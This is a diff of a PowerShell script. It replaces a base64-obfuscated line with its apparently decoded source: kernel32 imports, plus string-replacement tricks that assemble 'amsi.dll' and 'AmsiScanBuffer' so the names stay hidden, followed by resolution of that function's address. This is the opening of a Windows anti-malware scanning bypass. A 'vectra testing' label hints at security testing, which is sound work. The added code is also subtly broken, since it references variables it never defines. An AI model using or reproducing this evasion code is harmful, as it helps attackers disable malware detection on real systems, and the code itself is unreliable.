@@ -1,1 +1,64 @@
-[syStEm.Text.enCODinG]::UnicoDe.geTSTRing([SYSTeM.cONVErt]::FRomBase64StriNG("JEluaXRpYWxTdGFydCA9IDB4NTAwMDAKJE5lZ2F0aXZlT2Zmc2V0PSAweDUwMDAwCiRNYXhPZmZzZXQgPSAweDQwMDAwMDAKJFJlYWRCeXRlcyA9IDB4NTAwMDAKCgokQVBJcyA9IEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLkNvbXBvbmVudE1vZGVsOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKCnB1YmxpYyBjbGFzcyBBUElzIHsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkUHJvY2Vzc01lbW9yeShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEJhc2VBZGRyZXNzLCBieXRlW10gbHBCdWZmZXIsIFVJbnQzMiBuU2l6ZSwgcmVmIFVJbnQzMiBscE51bWJlck9mQnl0ZXNSZWFkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIiwgQ2hhclNldD1DaGFyU2V0LkFuc2ksIEV4YWN0U3BlbGxpbmc9dHJ1ZSwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwogICAgCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0TW9kdWxlSGFuZGxlKFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFdTdHIpXSBzdHJpbmcgbHBNb2R1bGVOYW1lKTsKCiAgICBbTWV0aG9kSW1wbChNZXRob2RJbXBsT3B0aW9ucy5Ob09wdGltaXphdGlvbiB8IE1ldGhvZEltcGxPcHRpb25zLk5vSW5saW5pbmcpXQogICAgcHVibGljIHN0YXRpYyBpbnQgRHVtbXkoKSB7CiAgIAkgcmV0dXJuIDE7CiAgICB9Cn0KIkAKCkFkZC1UeXBlICRBUElzCgokSW5pdGlhbERhdGU9R2V0LURhdGU7Cgokc3RyaW5nID0gJ2hlbGxvLCB3b3JsZCcKJHN0cmluZyA9ICRzdHJpbmcucmVwbGFjZSgnaGUnLCdhJykKJHN0cmluZyA9ICRzdHJpbmcucmVwbGFjZSgnbGwnLCdtJykKJHN0cmluZyA9ICRzdHJpbmcucmVwbGFjZSgnbywnLCdzJykKJHN0cmluZyA9ICRzdHJpbmcucmVwbGFjZSgnICcsJ2knKQokc3RyaW5nID0gJHN0cmluZy5yZXBsYWNlKCd3bycsJy5kJykKJHN0cmluZyA9ICRzdHJpbmcucmVwbGFjZSgncmxkJywnbGwnKQoKJHN0cmluZzIgPSAnaGVsbG8sIHdvcmxkJwokc3RyaW5nMiA9ICRzdHJpbmcyLnJlcGxhY2UoJ2hlJywnQScpCiRzdHJpbmcyID0gJHN0cmluZzIucmVwbGFjZSgnbGwnLCdtJykKJHN0cmluZzIgPSAkc3RyaW5nMi5yZXBsYWNlKCdvLCcsJ3MnKQokc3RyaW5nMiA9ICRzdHJpbmcyLnJlcGxhY2UoJyAnLCdpJykKJHN0cmluZzIgPSAkc3RyaW5nMi5yZXBsYWNlKCd3bycsJ1NjJykKJHN0cmluZzIgPSAkc3RyaW5nMi5yZXBsYWNlKCdybGQnLCdhbicpCgokc3RyaW5nMyA9ICdoZWxsbywgd29ybGQnCiRzdHJpbmczID0gJHN0cmluZzMucmVwbGFjZSgnaGVsbG8nLCdCdScpCiRzdHJpbmczID0gJHN0cmluZzMucmVwbGFjZSgnLCAnLCdmZicpCiRzdHJpbmczID0gJHN0cmluZzMucmVwbGFjZSgnd29ybGQnLCdlcicpCgokQWRkcmVzcyA9IFtBUElTXTo6R2V0TW9kdWxlSGFuZGxlKCRzdHJpbmcpCltJbnRQdHJdICRmdW5jQWRkciA9IFtBUElTXTo6R2V0UHJvY0FkZHJlc3MoJEFkZHJlc3MsICRzdHJpbmcyICsgJHN0cmluZzMp"))
+# Define named parameters
+$InitialStart = 0x50000
+$NegativeOffset= 0x50000
+$MaxOffset = 0x4000000
+$ReadBytes = 0x50000
+
+
+$APIs = @"
+using System;
+using System.ComponentModel;
+using System.Management.Automation;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class APIs {
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+
+    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
+    public static int Dummy() {
+   	 return 1;
+    }
+}
+"@
+
+Add-Type $APIs
+
+$InitialDate=Get-Date;
+$string4 = 'vectra testing'
+
+$hello = 'hello, world'
+$hello = $string.replace('he','a')
+$hello = $string.replace('ll','m')
+$hello = $string.replace('o,','s')
+$hello = $string.replace(' ','i')
+$hello = $string.replace('wo','.d')
+$hello = $string.replace('rld','ll')
+
+$hello2 = 'hello, world'
+$hello2 = $string2.replace('he','A')
+$hello2 = $string2.replace('ll','m')
+$hello2 = $string2.replace('o,','s')
+$hello2 = $string2.replace(' ','i')
+$hello2 = $string2.replace('wo','Sc')
+$hello2 = $string2.replace('rld','an')
+
+$hello3 = 'hello, world'
+$hello3 = $string3.replace('hello','Bu')
+$hello3 = $string3.replace(', ','ff')
+$hello3 = $string3.replace('world','er')
+
+$Address = [APIS]::GetModuleHandle($hello)
+[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $hello2 + $hello3)
